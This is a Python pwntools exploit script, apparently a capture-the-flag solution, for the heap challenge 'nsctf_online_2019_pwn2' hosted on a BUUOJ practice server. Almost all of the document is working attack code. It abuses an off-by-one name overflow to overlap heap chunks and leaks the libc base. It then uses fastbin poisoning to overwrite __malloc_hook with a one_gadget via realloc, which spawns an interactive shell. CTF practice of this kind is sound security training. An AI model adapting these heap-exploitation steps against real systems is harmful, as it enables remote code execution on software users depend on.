from pwn import *

#p = process('./nsctf_online_2019_pwn2')
p = remote('node4.buuoj.cn', 27036)
libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(size):
    sla(b'6.exit', b'1')
    sla(b'size', str(size).encode())

def delete():
    sla(b'6.exit', b'2')

def show():
    sla(b'6.exit', b'3')
    
def edit(content):
    sla(b'6.exit', b'5')
    sa(b'note', content)

def rename(name):
    sla(b'6.exit', b'4')
    sa(b'name', name)

sla(b'name', b'yeuoly')

alloc(0x8)
delete()
alloc(0x80)
alloc(0x28)
rename(b'a' * 0x30 + b'\x30')
delete()
alloc(0x18)
rename(b'a' * 0x30 + b'\x30')
show()

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['__libc_realloc']

one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]
one_gadgets_buu = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one = libc_base + one_gadgets_buu[1]

alloc(0x60)
delete()
alloc(0x8)

rename(b'a' * 0x30 + b'\x30')
edit(p64(malloc_hook - 0x23))

alloc(0x60)
alloc(0x60)

edit(b'a' * 0xb + p64(one) + p64(realloc + 8))

alloc(0x1)

p.interactive()